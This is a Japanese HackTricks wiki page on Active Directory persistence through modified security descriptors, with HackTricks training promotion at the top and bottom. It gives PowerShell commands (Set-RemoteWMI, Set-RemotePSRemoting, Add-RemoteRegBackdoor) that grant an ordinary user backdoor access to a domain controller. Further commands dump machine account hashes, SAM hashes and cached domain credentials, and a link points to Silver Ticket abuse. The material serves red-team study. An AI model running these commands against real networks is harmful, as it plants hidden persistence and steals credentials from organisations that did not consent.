# セキュリティ記述子

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

## セキュリティ記述子

[ドキュメントから](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)：セキュリティ記述子定義言語（SDDL）は、セキュリティ記述子を記述するために使用されるフォーマットを定義します。SDDLはDACLおよびSACLのためにACE文字列を使用します：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**セキュリティ記述子**は、**オブジェクト**が**オブジェクト**に対して**持つ****権限**を**保存**するために使用されます。オブジェクトの**セキュリティ記述子**に**少しの変更**を加えることができれば、そのオブジェクトに対して非常に興味深い特権を取得でき、特権グループのメンバーである必要はありません。

この永続性技術は、特定のオブジェクトに対して必要なすべての特権を獲得する能力に基づいており、通常は管理者特権を必要とするタスクを実行できるようにしますが、管理者である必要はありません。

### WMIへのアクセス

ユーザーに**リモートでWMIを実行する**アクセスを与えることができます[**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)：
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

**winrm PSコンソールへのアクセスをユーザーに与える** [**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### ハッシュへのリモートアクセス

**レジストリ**にアクセスし、**DAMP**を使用して**ハッシュをダンプ**し、**Regバックドアを作成**します。これにより、いつでも**コンピュータのハッシュ**、**SAM**、およびコンピュータ内の任意の**キャッシュされたAD**資格情報を取得できます。したがって、これは**ドメインコントローラコンピュータ**に対して**一般ユーザー**にこの権限を与えるのに非常に便利です。
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
チェック [**Silver Tickets**](silver-ticket.md) で、ドメインコントローラーのコンピューターアカウントのハッシュをどのように使用できるかを学びましょう。

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
